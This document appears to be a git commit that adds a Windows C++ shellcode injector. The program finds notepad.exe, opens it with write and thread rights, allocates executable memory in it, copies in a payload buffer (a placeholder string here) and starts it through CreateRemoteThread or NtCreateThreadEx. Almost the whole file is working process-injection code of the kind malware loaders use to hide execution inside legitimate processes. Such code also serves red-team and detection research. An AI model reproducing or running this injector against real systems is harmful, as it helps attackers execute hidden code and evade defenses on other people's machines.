b4094730cb8e6b244c45e005faa9a3bd3dc21106
Nero22k <64486541+Nero22k@users.noreply.github.com>
2021-01-25 09:41:59 +0000

    Create Classic.cpp

---
+++ Classic.cpp
@@ -0,0 +1,133 @@
+#include <winternl.h>
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <tlhelp32.h>
+#include <wincrypt.h>
+#pragma comment (lib, "crypt32.lib")
+#pragma comment (lib, "advapi32")
+
+typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
+	IN HANDLE ProcessHandle,
+	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
+	IN BOOLEAN CreateSuspended,
+	IN ULONG StackZeroBits,
+	IN OUT PULONG StackReserved,
+	IN OUT PULONG StackCommit,
+	IN PVOID StartAddress,
+	IN PVOID StartParameter OPTIONAL,
+	OUT PHANDLE ThreadHandle,
+	OUT PCLIENT_ID ClientId);
+
+typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
+	OUT PHANDLE hThread,
+	IN ACCESS_MASK DesiredAccess,
+	IN PVOID ObjectAttributes,
+	IN HANDLE ProcessHandle,
+	IN PVOID lpStartAddress,
+	IN PVOID lpParameter,
+	IN ULONG Flags,
+	IN SIZE_T StackZeroBits,
+	IN SIZE_T SizeOfStackCommit,
+	IN SIZE_T SizeOfStackReserve,
+	OUT PVOID lpBytesBuffer);
+  
+unsigned char payload[] = {"SHELLCODE GOES HERE"};
+unsigned int payload_len = sizeof(payload);
+
+int FindTarget(const char *procname) {
+
+        HANDLE hProcSnap;
+        PROCESSENTRY32 pe32;
+        int pid = 0;
+                
+        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
+                
+        pe32.dwSize = sizeof(PROCESSENTRY32); 
+                
+        if (!Process32First(hProcSnap, &pe32)) {
+                CloseHandle(hProcSnap);
+                return 0;
+        }
+                
+        while (Process32Next(hProcSnap, &pe32)) {
+                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
+                        pid = pe32.th32ProcessID;
+                        break;
+                }
+        }
+                
+        CloseHandle(hProcSnap);
+                
+        return pid;
+}
+
+
+// classic injection
+int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
+
+	LPVOID pRemoteCode = NULL;
+	HANDLE hThread = NULL;
+  
+	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
+	
+	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
+	if (hThread != NULL) {
+			WaitForSingleObject(hThread, 500);
+			CloseHandle(hThread);
+			return 0;
+	}
+	return -1;
+}
+
+
+// variants of classic injection
+int Inject2(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
+
+	LPVOID pRemoteCode = NULL;
+	HANDLE hThread = NULL;
+	CLIENT_ID cid;
+
+	//RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
+	NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateThreadEx");
+
+	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
+	
+	//pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteCode, 0, &hThread, &cid);
+ 
+	pNtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProc, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, NULL, NULL, NULL, NULL, NULL);   //Executes the payload
+	if (hThread != NULL) {
+			WaitForSingleObject(hThread, 500);
+			CloseHandle(hThread);
+			return 0;
+	}
+	return -1;
+}
+
+
+int main(void) {
+    
+	int pid = 0;
+    HANDLE hProc = NULL;
+
+	pid = FindTarget("notepad.exe");
+
+	if (pid) {
+		printf("Notepad.exe PID = %d\n", pid);
+
+		// try to open target process
+		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
+						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
+						FALSE, (DWORD) pid);
+
+		if (hProc != NULL) {
+			Inject2(hProc, payload, payload_len);
+			CloseHandle(hProc);
+		}
+	}
+	return 0;
+}
